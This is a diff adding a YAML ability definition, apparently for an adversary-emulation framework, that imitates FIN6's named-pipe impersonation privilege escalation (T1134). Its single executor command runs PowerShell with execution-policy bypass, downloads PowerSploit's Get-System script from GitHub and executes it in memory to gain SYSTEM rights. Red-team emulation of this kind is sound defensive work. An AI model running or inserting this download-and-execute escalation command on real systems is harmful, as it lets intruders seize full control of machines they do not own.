@@ -1,0 +1,32 @@
+ability_id: a89ea459-97ec-28fd-a552-9d305f023bbe
+access: {}
+additional_info: {}
+buckets:
+- privilege-escalation
+delete_payload: true
+description: PowerSploit named-pipe impersonation, similar to the technique used to
+  escalate to SYSTEM-level privileges by FIN6.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1');
+    Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: PowerSploit Named-Pipe Impersonation
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: privilege-escalation
+technique_id: T1134
+technique_name: Access Token Manipulation
